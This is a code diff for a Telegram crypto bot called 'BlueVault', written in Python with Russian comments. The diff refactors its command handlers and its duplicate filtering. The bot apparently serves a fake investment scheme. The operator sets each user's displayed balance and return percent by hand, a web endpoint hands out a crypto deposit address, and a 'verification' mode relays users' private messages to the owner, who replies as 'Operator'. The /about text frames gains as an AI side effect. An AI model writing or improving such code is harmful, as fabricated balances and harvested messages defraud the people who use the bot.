@@ -55,20 +55,33 @@ app = Flask(__name__)
 
 _handled = set()
 verification_sessions = {}
+last_message_time = {}
 
-# Защита от множественной регистрации
-if not hasattr(bot, '_handlers_registered'):
-    bot._handlers_registered = False
-
-def already_handled(event):
+def is_duplicate(event):
+    """Усиленная защита от дублей"""
     msg_id = getattr(event, 'id', None)
     if not msg_id:
         return False
+    
     if msg_id in _handled:
         return True
+    
+    # Защита по времени (на всякий случай)
+    user_id = event.sender_id
+    now = datetime.now().timestamp()
+    key = f"{user_id}_{msg_id}"
+    
+    if key in last_message_time and now - last_message_time[key] < 2:
+        return True
+    
+    last_message_time[key] = now
     _handled.add(msg_id)
+    
     if len(_handled) > 30000:
         _handled.clear()
+    if len(last_message_time) > 10000:
+        last_message_time.clear()
+    
     return False
 
 # ====================== HTML ======================
@@ -206,15 +219,16 @@ def get_balance():
 def get_address():
     return jsonify({'address': CRYPTO_ADDRESS})
 
-# ====================== РЕГИСТРАЦИЯ ОБРАБОТЧИКОВ ======================
-async def register_handlers():
-    if bot._handlers_registered:
+# ====================== ОБРАБОТЧИКИ ======================
+@bot.on(events.NewMessage(incoming=True))
+async def handle_all_messages(event):
+    """Единый обработчик — самый надёжный способ избежать дублей"""
+    if is_duplicate(event):
         return
-    bot._handlers_registered = True
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/start'))
-    async def start(event):
-        if already_handled(event): return
+    text = event.raw_text.strip()
+
+    if text == '/start':
         user_id = str(event.sender_id)
         user_balances.setdefault(user_id, 0)
         save_data(user_balances, current_percent)
@@ -222,9 +236,7 @@ async def register_handlers():
             [Button.url('🚀 Open App', 'https://t.me/BlueVaultt_bot/bluevallet')]
         ])
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/about'))
-    async def about(event):
-        if already_handled(event): return
+    elif text == '/about':
         await event.respond(
             'ℹ **About BlueVault**\n\n'
             '**1. Схема работы:** Участник предоставляет интерфейс доступа к бирже. Система (набор алгоритмов и трейдботов) анализирует данные и совершает тестовые транзакции. Любые положительные изменения на счёте — технический побочный эффект работы ИИ.\n\n'
@@ -233,11 +245,9 @@ async def register_handlers():
             '**4. Благодарность:** Спасибо за использование BlueVault. Ваше участие помогает тестировать и дорабатывать алгоритмы нового поколения в реальных рыночных условиях.'
         )
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/setbalance'))
-    async def set_balance(event):
-        if already_handled(event) or event.sender_id != OWNER_ID: return
+    elif text.startswith('/setbalance') and event.sender_id == OWNER_ID:
         try:
-            _, target_id, amount = event.text.split()
+            _, target_id, amount = text.split()
             target_id = str(target_id)
             user_balances[target_id] = float(amount)
             save_data(user_balances, current_percent)
@@ -245,72 +255,60 @@ async def register_handlers():
         except:
             await event.respond('/setbalance <id> <amount>')
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/setpercent'))
-    async def set_percent(event):
-        if already_handled(event) or event.sender_id != OWNER_ID: return
+    elif text.startswith('/setpercent') and event.sender_id == OWNER_ID:
         try:
             global current_percent
-            current_percent = int(event.text.split()[1])
+            current_percent = int(text.split()[1])
             save_data(user_balances, current_percent)
             await event.respond(f'Percent set to {current_percent}%')
         except:
             await event.respond('/setpercent <number>')
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/myid'))
-    async def myid(event):
-        if already_handled(event): return
+    elif text == '/myid':
         await event.respond(f'Your ID: {event.sender_id}')
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/msg'))
-    async def msg(event):
-        if already_handled(event) or event.sender_id != OWNER_ID: return
+    elif text.startswith('/msg') and event.sender_id == OWNER_ID:
         try:
-            parts = event.text.split(maxsplit=2)
-            target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
+            parts = text.split(maxsplit=2)
+            target_id = int(parts[1])
+            message = parts[2] if len(parts) > 2 else ''
             await bot.send_message(target_id, message)
             await event.respond('Sent')
         except:
             await event.respond('/msg <id> <text>')
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/verify'))
-    async def verify(event):
-        if already_handled(event): return
+    elif text == '/verify':
         verification_sessions[event.sender_id] = True
         await event.respond('✅ Verification started. Send your messages below.')
         await bot.send_message(OWNER_ID, f'#VERIFY User {event.sender_id} started verification.')
 
-    @bot.on(events.NewMessage(incoming=True, func=lambda e: e.sender_id in verification_sessions and e.text and not e.text.startswith('/')))
-    async def handle_verification(event):
-        if already_handled(event): return
-        await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {event.text}')
-
-    @bot.on(events.NewMessage(incoming=True, pattern='/reply'))
-    async def reply(event):
-        if already_handled(event) or event.sender_id != OWNER_ID: return
+    elif text.startswith('/reply') and event.sender_id == OWNER_ID:
         try:
-            parts = event.text.split(maxsplit=2)
-            target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
+            parts = text.split(maxsplit=2)
+            target_id = int(parts[1])
+            message = parts[2] if len(parts) > 2 else ''
             await bot.send_message(target_id, f'🛡 Operator: {message}')
             await event.respond('Replied')
         except:
             await event.respond('/reply <id> <text>')
 
-    @bot.on(events.NewMessage(incoming=True, pattern='/endverify'))
-    async def end_verify(event):
-        if already_handled(event) or event.sender_id != OWNER_ID: return
+    elif text.startswith('/endverify') and event.sender_id == OWNER_ID:
         try:
-            target_id = int(event.text.split()[1])
+            target_id = int(text.split()[1])
             verification_sessions.pop(target_id, None)
             await bot.send_message(target_id, '✅ Verification completed.')
             await event.respond(f'Ended for {target_id}')
         except:
             await event.respond('/endverify <id>')
 
+    # Обработка сообщений для верификации
+    elif event.sender_id in verification_sessions and text and not text.startswith('/'):
+        await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {text}')
+
 # ====================== ЗАПУСК ======================
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
-    await register_handlers()
-    logger.info("✅ Бот BlueVault запущен успешно")
+    logger.info("✅ Бот BlueVault успешно запущен")
     await bot.run_until_disconnected()
 
 def run_flask():
